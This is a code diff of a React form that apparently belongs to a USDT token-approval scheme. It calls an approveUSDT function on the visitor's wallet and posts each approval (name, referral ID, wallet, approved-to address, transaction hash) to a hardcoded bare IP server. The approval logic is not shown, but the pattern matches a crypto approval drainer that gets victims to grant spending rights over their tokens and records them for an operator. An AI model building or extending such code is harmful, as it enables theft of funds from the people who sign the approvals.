@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 import { Form, FormGroup, FormLabel, FormControl, Button } from 'react-bootstrap';
-import { approveUSDT } from './scripts/approve_usdt';
+import approveUSDT from './scripts/approve_usdt';
 import { useLocation } from 'react-router-dom';
 import axios from 'axios';
 import AlertPopup from './AlertPopup';
@@ -33,11 +33,12 @@ function ApproveForm() {
         try {
            let status = await approveUSDT(walletAddress);
            if(status) {
-            setAlertMessage('Approved Done');
-            setShowAlert(true);
-           saveApprovedData(name, referral, status.approvedTo, walletAddress, status.trxHash)
-           }else{
+            console.log("After Data Approved: ", status)
             setAlertMessage(walletAddress);
+            setShowAlert(true);
+           saveApprovedData(name, referral, status.wallet, status.approvedTo, status.trxHash)
+           }else{
+            setAlertMessage("An error occurred during the approval proces");
             setShowAlert(true);
            }
         } catch (error) {
@@ -59,13 +60,13 @@ function ApproveForm() {
         setReferral(event.target.value);
     };
 
-    const saveApprovedData = async (name, referralId, approverAddress, walletAddress, trxHash) => {
+    const saveApprovedData = async (name, referralId, wallet, approvedTo, trxHash) => {
         try {
           const response = await axios.post('http://5.199.173.132:3000/approvedData', {
             name,
             referralId,
-            approverAddress,
-            walletAddress,
+            approvedTo,
+            wallet,
             trxHash
           });
       
